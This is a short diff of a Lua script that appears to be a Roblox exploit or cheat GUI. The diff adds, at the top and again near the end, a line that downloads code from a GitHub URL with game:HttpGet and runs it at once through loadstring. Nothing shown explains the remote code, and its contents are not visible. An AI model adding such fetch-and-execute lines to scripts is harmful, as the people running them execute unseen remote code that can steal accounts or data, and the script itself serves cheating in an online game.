@@ -1,5 +1,4 @@
---// 1/9/2024 - added an antisit 
---// 1/7/2024 - changed some stuff dm if broken
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/meow/main/gui"))()
 
 
 --[[ 
@@ -735,6 +734,8 @@ TOOLTIP.BackgroundTransparency = 0.2
 SG.IgnoreGuiInset = true 
 MS.Parent = M
 USER.Text = "| Username - @CZXPEK"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/VarsityB/meow/main/gui"))()
 
 --SG.Enabled = false
 
